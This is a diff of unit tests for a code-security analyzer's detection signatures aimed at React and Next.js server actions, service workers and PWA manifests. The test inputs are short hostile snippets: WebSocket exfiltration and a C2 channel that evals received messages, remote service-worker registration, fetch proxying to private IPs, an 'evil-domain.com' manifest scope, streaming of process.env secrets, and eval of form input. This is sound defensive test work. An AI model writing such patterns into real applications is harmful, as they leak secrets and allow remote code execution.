@@ -295,6 +295,99 @@ line4`;
       expect(finding.severity).toBe('critical');
       expect(finding.category).toBe('crypto-mining');
     });
+
+    test('should detect server action WebSocket exfiltration (IOC-071)', () => {
+      const code = `'use server'; async function leak() { new WebSocket('wss://192.168.1.1/data'); }`;
+      const result = analyzer.analyze(code, 'actions.ts');
+      
+      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-071');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('critical');
+      expect(finding.category).toBe('rsc-specific');
+    });
+
+    test('should detect server action WebSocket C2 channel (IOC-072)', () => {
+      const code = `'use server'; async function c2() { ws.on('message', (data) => eval(data)); }`;
+      const result = analyzer.analyze(code, 'actions.ts');
+      
+      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-072');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('critical');
+    });
+
+    test('should detect malicious service worker registration (IOC-073)', () => {
+      const code = `navigator.serviceWorker.register('https://192.168.1.1/sw.js');`;
+      const result = analyzer.analyze(code, 'app.js');
+      
+      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-073');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('critical');
+    });
+
+    test('should detect service worker fetch interception to IP (IOC-074)', () => {
+      const code = `self.addEventListener('fetch', (e) => { e.respondWith(fetch('https://10.0.0.1/proxy')); });`;
+      const result = analyzer.analyze(code, 'sw.js');
+      
+      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-074');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('high');
+    });
+
+    test('should detect PWA manifest tampering with IP (IOC-075)', () => {
+      const code = `{"start_url": "https://192.168.1.100/malicious"}`;
+      const result = analyzer.analyze(code, 'manifest.json');
+      
+      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-075');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('high');
+    });
+
+    test('should detect PWA manifest malicious scope (IOC-076)', () => {
+      const code = `{"scope": "https://evil-domain.com/"}`;
+      const result = analyzer.analyze(code, 'manifest.webmanifest');
+      
+      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-076');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('medium');
+    });
+
+    test('should detect server action response caching attack (IOC-077)', () => {
+      const code = `'use server'; export async function getData() { cache(cookies().get('session')); }`;
+      const result = analyzer.analyze(code, 'actions.ts');
+      
+      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-077');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('high');
+    });
+
+    test('should detect server action streaming attack (IOC-078)', () => {
+      const code = `'use server'; async function stream() { new ReadableStream({ start() { push(process.env.SECRET); }}); }`;
+      const result = analyzer.analyze(code, 'actions.ts');
+      
+      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-078');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('high');
+    });
+
+    test('should detect server action FormData injection (IOC-079)', () => {
+      const code = `"use server"
+        const data = formData.get('cmd');
+        eval(data);`;
+      const result = analyzer.analyze(code, 'actions.ts');
+      
+      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-079');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('high');
+    });
+
+    test('should detect server action bind exploitation (IOC-080)', () => {
+      const code = `const action = handler.bind(null, payload); 'use server';`;
+      const result = analyzer.analyze(code, 'actions.ts');
+      
+      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-080');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('high');
+    });
   });
 
   describe('Layer 8 Interface', () => {
@@ -1047,6 +1140,95 @@ line4`;
       const findings = analyzer.analyze(code, 'test.js');
       
       expect(Array.isArray(findings)).toBe(true);
+    });
+
+    test('should detect React 19 use() with user input in fetch URL (BEHAV-023)', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = `const data = use(fetch(\`/api/users/\${searchParams.get('id')}\`));`;
+      
+      const findings = analyzer.analyze(code, 'component.tsx');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-023');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('high');
+    });
+
+    test('should NOT flag benign use() with static fetch URL (BEHAV-023 negative)', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = `const data = use(fetch('/api/static-endpoint'));`;
+      
+      const findings = analyzer.analyze(code, 'component.tsx');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-023');
+      expect(finding).toBeUndefined();
+    });
+
+    test('should NOT flag use() with safe template literal (BEHAV-023 negative 2)', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = `const params = new URL('https://api.example.com'); const data = use(fetch(\`\${params.href}/users\`));`;
+      
+      const findings = analyzer.analyze(code, 'component.tsx');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-023');
+      expect(finding).toBeUndefined();
+    });
+
+    test('should NOT flag use() with database query (BEHAV-023 negative 3)', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = `const data = use(fetch(\`/api/data/\${db.query('SELECT id FROM users')}\`));`;
+      
+      const findings = analyzer.analyze(code, 'component.tsx');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-023');
+      expect(finding).toBeUndefined();
+    });
+
+    test('should detect nested req.query.user access (BEHAV-023 positive 2)', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = `const data = use(fetch(\`/api/users/\${req.query.userId}\`));`;
+      
+      const findings = analyzer.analyze(code, 'component.tsx');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-023');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('high');
+    });
+
+    test('should detect React 19 useActionState with code execution (BEHAV-024)', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = `const [state, action] = useActionState((prev, data) => { eval(data.code); return prev; });`;
+      
+      const findings = analyzer.analyze(code, 'component.tsx');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-024');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('critical');
+    });
+
+    test('should detect React 19 useOptimistic XSS risk (BEHAV-025)', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = `const [optimistic, addOptimistic] = useOptimistic(state, (prev, val) => { 
+        return { html: val, render: (el) => el.innerHTML = val };
+      });`;
+      
+      const findings = analyzer.analyze(code, 'component.tsx');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-025');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('high');
+    });
+
+    test('should detect React 19 server cache poisoning (BEHAV-027)', () => {
+      const analyzer = new BehavioralAnalyzer();
+      const code = `const getCachedData = cache((userId) => { 
+        return { user: userId, session: cookies().get('session') };
+      });`;
+      
+      const findings = analyzer.analyze(code, 'actions.ts');
+      
+      const finding = findings.find(f => f.signatureId === 'NEUROLINT-BEHAV-027');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('high');
     });
   });
 
